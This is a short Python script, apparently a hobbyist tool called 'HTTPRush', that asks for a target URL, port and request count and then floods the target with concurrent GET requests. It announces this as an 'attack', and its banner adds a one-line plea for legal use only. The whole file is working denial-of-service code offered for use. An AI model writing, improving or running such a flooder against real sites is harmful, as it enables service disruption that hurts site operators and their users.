import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
import pyfiglet

init(autoreset=True)

def print_banner():
    http_rush = pyfiglet.figlet_format("HTTPRush", font="slant")
    print(Fore.BLUE + http_rush)
    print(Fore.RED + "Plz, only use this for legal actions.")
    print(Fore.RED + "Tool made by: Just A Random")

def get_user_input():
    print(Fore.GREEN + "\n[+] Welcome to HTTPRush! [+]\n")
    url = input(Fore.YELLOW + "Target URL: ")
    port = input(Fore.YELLOW + "Port: ")
    num_bots = int(input(Fore.YELLOW + "Number of requests: "))
    
    if not port:
        port = 80
    else:
        port = int(port)
    
    return url, port, num_bots

def visit_site(url, port):
    headers = {'User-Agent': 'My Bot'}
    url_with_port = f"{url}:{port}"
    response = requests.get(url_with_port, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + f'Success: {url_with_port}')
    else:
        print(Fore.RED + f'Failure: {url_with_port}')

def main():
    print_banner()
    url, port, num_bots = get_user_input()
    
    print(Fore.YELLOW + f"\n[+] Starting attack with {num_bots} requests on {url}:{port} [+]\n")
    
    with ThreadPoolExecutor(max_workers=num_bots) as executor:
        for _ in range(num_bots):
            executor.submit(visit_site, url, port)
    
    print(Fore.GREEN + "\n[+] Tysm for use HTTPRush! [+]\n")

if __name__ == "__main__":
    main()
